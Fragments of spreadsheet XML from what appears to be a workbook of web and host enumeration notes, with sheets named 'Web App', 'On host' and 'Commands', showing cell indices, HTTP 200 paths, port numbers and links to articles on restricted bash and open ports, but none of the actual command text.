        <v>47</v>
      </c>
      <c r="F6" s="4"/>
    </row>
    <row r="7" spans="1:8" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A7" s="2" t="s">
        <v>101</v>
      </c>
      <c r="B7" s="2" t="s">
        <v>32</v>
      </c>
      <c r="C7" s="2" t="str">
        <f t="shared" si="0"/>
        <v xml:space="preserve">200 </v>
      </c>
      <c r="D7" s="2" t="str">
        <f t="shared" si="1"/>
        <v>images/</v>
      </c>
      <c r="E7" s="2" t="s">
        <v>47</v>
      </c>
    </row>
    <row r="8" spans="1:8" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A8" s="2" t="s">
        <v>101</v>
      </c>
      <c r="B8" s="2" t="s">
        <v>33</v>
      </c>
      <c r="C8" s="2" t="str">
        <f t="shared" si="0"/>
        <v xml:space="preserve">200 </v>
      </c>
      <c r="D8" s="2" t="str">
        <f t="shared" si="1"/>
        <v>index.html</v>
      </c>
      <c r="E8" s="2" t="s">
        <v>43</v>
      </c>
    </row>
    <row r="9" spans="1:8" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A9" s="2" t="s">
        <v>101</v>
      </c>
      <c r="B9" s="2" t="s">
        <v>34</v>
      </c>
      <c r="C9" s="2" t="str">
        <f t="shared" si="0"/>
        <v xml:space="preserve">200 </v>
      </c>
      <c r="D9" s="2" t="str">
        <f>MID($B9,FIND("/",$B9)+1,LEN($B9))</f>
        <v>LICENSE.txt</v>
      </c>
      <c r="E9" s="2" t="s">
        <v>49</v>
      </c>
    </row>
    <row r="10" spans="1:8" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A10" s="2" t="s">
        <v>101</v>
      </c>
      <c r="B10" s="2" t="s">
        <v>35</v>
      </c>
      <c r="C10" s="2" t="str">
        <f t="shared" si="0"/>
        <v xml:space="preserve">200 </v>
      </c>
      <c r="D10" s="2" t="str">
        <f t="shared" si="1"/>
        <v>README.txt</v>
      </c>
      <c r="E10" s="2" t="s">
        <v>45</v>
      </c>
      <c r="F10" s="5" t="s">
        <v>46</v>
      </c>
    </row>
    <row r="11" spans="1:8" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A11" s="2" t="s">
        <v>101</v>
      </c>
      <c r="B11" s="2" t="s">
        <v>40</v>
      </c>
      <c r="C11" s="2">
        <v>200</v>
      </c>
      <c r="D11" s="2" t="s">
        <v>39</v>
      </c>
      <c r="E11" s="2" t="s">
        <v>44</v>
      </c>
    </row>
    <row r="24" spans="7:7" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="G24" s="5"/>
    </row>
  </sheetData>
  <phoneticPr fontId="3" type="noConversion"/>
  <hyperlinks>
    <hyperlink ref="F10" r:id="rId1" xr:uid="{9F6736EF-044B-4143-BB46-C03D40D313AE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4"/>
  <sheetViews>
    <sheetView zoomScale="69" zoomScaleNormal="69" workbookViewId="0">
      <pane ySplit="1" topLeftCell="A2" activePane="bottomLeft" state="frozen"/>
      <selection activeCell="B1" sqref="B1"/>
      <selection pane="bottomLeft" activeCell="A4" sqref="A4"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr defaultRowHeight="15" customHeight="1" x14ac:dyDescent="0.3"/>
  <cols>
    <col min="1" max="1" width="16.109375" style="2" customWidth="1"/>
    <col min="2" max="2" width="12.109375" style="2" customWidth="1"/>
    <col min="3" max="3" width="10.44140625" style="2" customWidth="1"/>
    <col min="4" max="4" width="11.5546875" style="2" customWidth="1"/>
    <col min="5" max="5" width="17.6640625" style="2" bestFit="1" customWidth="1"/>
    <col min="6" max="6" width="33.77734375" style="2" customWidth="1"/>
    <col min="7" max="7" width="25.109375" style="2" customWidth="1"/>
    <col min="8" max="8" width="69.44140625" style="2" customWidth="1"/>
    <col min="9" max="9" width="33.44140625" style="2" customWidth="1"/>
    <col min="10" max="10" width="77.88671875" style="2" customWidth="1"/>
    <col min="11" max="11" width="33.77734375" style="2" customWidth="1"/>
    <col min="12" max="16384" width="8.886718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100</v>
      </c>
      <c r="E2" s="2" t="s">
        <v>60</v>
      </c>
      <c r="F2" s="2" t="s">
        <v>62</v>
      </c>
      <c r="H2" s="2" t="s">
        <v>83</v>
      </c>
      <c r="I2" s="5" t="s">
        <v>80</v>
      </c>
      <c r="J2" s="2" t="s">
        <v>82</v>
      </c>
    </row>
    <row r="3" spans="1:11" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A3" s="1" t="s">
        <v>100</v>
      </c>
      <c r="B3" s="2" t="s">
        <v>65</v>
      </c>
      <c r="C3" s="2">
        <v>631</v>
      </c>
      <c r="D3" s="2" t="s">
        <v>63</v>
      </c>
      <c r="E3" s="1" t="s">
        <v>60</v>
      </c>
      <c r="H3" s="2" t="s">
        <v>79</v>
      </c>
      <c r="I3" s="5" t="s">
        <v>77</v>
      </c>
      <c r="J3" s="2" t="s">
        <v>76</v>
      </c>
    </row>
    <row r="4" spans="1:11" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A4" s="1" t="s">
        <v>100</v>
      </c>
      <c r="B4" s="2" t="s">
        <v>73</v>
      </c>
      <c r="C4" s="2">
        <v>5355</v>
      </c>
      <c r="D4" s="2" t="s">
        <v>63</v>
      </c>
    </row>
  </sheetData>
  <phoneticPr fontId="3" type="noConversion"/>
  <hyperlinks>
    <hyperlink ref="I2" r:id="rId1" display="https://www.tecmint.com/rbash-restricted-bash-shell/" xr:uid="{D2F60FB5-7330-4484-9C7C-AAC210869DAB}"/>
    <hyperlink ref="I3" r:id="rId2" display="https://www.cyberciti.biz/faq/what-process-has-open-linux-port/" xr:uid="{B2B3B132-FE82-40F4-9EA7-232E5041DDF7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27"/>
  <sheetViews>
    <sheetView zoomScale="80" zoomScaleNormal="80" workbookViewId="0">
      <selection activeCell="F14" sqref="F14"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr defaultRowHeight="15" customHeight="1" x14ac:dyDescent="0.3"/>
  <cols>
    <col min="1" max="1" width="118.88671875" style="7" bestFit="1" customWidth="1"/>
    <col min="2" max="16384" width="8.88671875" style="1"/>
  </cols>
  <sheetData>
    <row r="1" spans="1:1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A1" s="3" t="s">
        <v>6</v>
      </c>
    </row>
    <row r="2" spans="1:1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A2" s="1" t="s">
        <v>88</v>
      </c>
    </row>
    <row r="3" spans="1:1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A3" s="1" t="s">
        <v>89</v>
      </c>
    </row>
    <row r="4" spans="1:1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A4" s="7" t="s">
        <v>20</v>
      </c>
    </row>
    <row r="5" spans="1:1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A5" s="7" t="s">
        <v>19</v>
      </c>
    </row>
    <row r="6" spans="1:1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A6" s="7" t="s">
        <v>27</v>
      </c>
    </row>
    <row r="7" spans="1:1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A7" s="7" t="s">
        <v>90</v>
      </c>
    </row>
    <row r="8" spans="1:1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A8" s="7" t="s">
        <v>91</v>
      </c>
    </row>
    <row r="9" spans="1:1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A9" s="7" t="s">
        <v>92</v>
      </c>
    </row>
    <row r="10" spans="1:1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A10" s="7" t="s">
        <v>93</v>
      </c>
    </row>
    <row r="11" spans="1:1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A11" s="7" t="s">
        <v>94</v>
      </c>
    </row>
    <row r="12" spans="1:1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A12" s="7" t="s">
        <v>61</v>
      </c>
    </row>
    <row r="13" spans="1:1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A13" s="7" t="s">
        <v>95</v>
      </c>
    </row>
    <row r="14" spans="1:1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A14" s="7" t="s">
        <v>81</v>
      </c>
    </row>
    <row r="15" spans="1:1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A15" s="7" t="s">
        <v>64</v>
      </c>
    </row>
    <row r="16" spans="1:1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A16" s="7" t="s">
        <v>96</v>
      </c>
    </row>
    <row r="17" spans="1:1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A17" s="7" t="s">
        <v>67</v>
      </c>
    </row>
    <row r="18" spans="1:1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A18" s="7" t="s">
        <v>69</v>
      </c>
    </row>
    <row r="19" spans="1:1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A19" s="7" t="s">
        <v>70</v>
      </c>
    </row>
    <row r="20" spans="1:1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A20" s="7" t="s">
        <v>97</v>
      </c>
    </row>
    <row r="21" spans="1:1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A21" s="7" t="s">
        <v>78</v>
      </c>
    </row>
    <row r="22" spans="1:1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A22" s="7" t="s">
        <v>98</v>
      </c>
    </row>
    <row r="23" spans="1:1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A23" s="7" t="s">
        <v>85</v>
      </c>
    </row>
    <row r="24" spans="1:1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A24" s="8" t="s">
        <v>99</v>
      </c>
    </row>
    <row r="25" spans="1:1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A25" s="7" t="s">
        <v>86</v>
      </c>
    </row>
    <row r="26" spans="1:1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A26" t="s">
        <v>87</v>
      </c>
    </row>
    <row r="27" spans="1:1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A27" s="7" t="s">
        <v>84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"/>
  <sheetViews>
    <sheetView workbookViewId="0">
      <selection activeCell="A27" sqref="A27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Web App</vt:lpstr>
      <vt:lpstr>On host</vt:lpstr>
      <vt:lpstr>Commands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2026-06-25T16:03:27Z</dcterms:modified>
</cp:coreProperties>
</file>